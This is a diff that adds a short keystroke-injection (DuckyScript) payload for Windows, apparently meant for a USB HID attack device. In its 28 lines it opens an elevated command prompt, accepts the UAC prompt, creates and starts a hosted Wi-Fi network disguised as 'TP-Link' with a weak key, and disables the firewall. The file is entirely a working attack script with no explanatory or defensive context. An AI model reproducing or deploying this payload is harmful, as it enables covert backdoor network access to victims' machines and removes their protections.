@@ -1,0 +1,28 @@
+DELAY 500
+WINDOWS q
+DELAY 400
+STRING cmd
+DELAY 400
+MENU
+DELAY 300
+RIGHTARROW
+DELAY 300
+RIGHTARROW
+DELAY 300
+RIGHTARROW
+DELAY 300
+ENTER
+DELAY 600
+ALT y
+DELAY 800
+ENTER
+STRING netsh wlan set hostednetwork mode=allow ssid=TP-Link key=12345678
+ENTER
+DELAY 100
+STRING netsh wlan start hostednetwork
+ENTER
+DELAY 100
+STRING netsh firewall set opmode disable
+ENTER
+STRING exit
+ENTER
